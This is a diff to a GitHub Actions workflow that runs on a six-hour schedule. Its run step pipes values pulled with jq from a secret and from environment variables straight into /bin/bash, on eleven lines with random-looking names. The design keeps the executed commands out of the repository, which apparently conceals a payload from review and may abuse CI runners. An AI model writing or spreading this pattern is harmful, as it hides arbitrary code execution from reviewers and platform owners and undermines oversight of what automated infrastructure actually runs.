@@ -2,19 +2,27 @@ name: changtaizhu1234
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 4/6 * * *'
+    - cron: '36 3/6 * * *'
 
-jobs:  # 25753
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: changtaizhu1234
         env:
-          m77856: ${{ secrets.m77856 }}
+          oa1: ${{ secrets.oa1 }}
         run: |
-          echo $m77856 | jq -r .a92896 | /bin/bash
-          echo $tsiq3 | jq -r .daeqg49574 | /bin/bash
-          echo $yvafg194 | jq -r .e387 | /bin/bash
-          echo $wulw82626 | jq -r .j46 | /bin/bash
+          echo $oa1 | jq -r .zyhel8883 | /bin/bash
+          echo $km42709 | jq -r .gydz3 | /bin/bash
+          echo $tnban7 | jq -r .qpoff8 | /bin/bash
+          echo $cdqbq6287 | jq -r .w16 | /bin/bash
+          echo $nzu999 | jq -r .vu15533 | /bin/bash
+          echo $x44926 | jq -r .z4 | /bin/bash
+          echo $lzuzp176 | jq -r .dmv1 | /bin/bash
+          echo $tyi7457 | jq -r .trey78202 | /bin/bash
+          echo $a1 | jq -r .rrtk6472 | /bin/bash
+          echo $xww39707 | jq -r .wzp54900 | /bin/bash
+          echo $yhl52875 | jq -r .wqb9 | /bin/bash
 
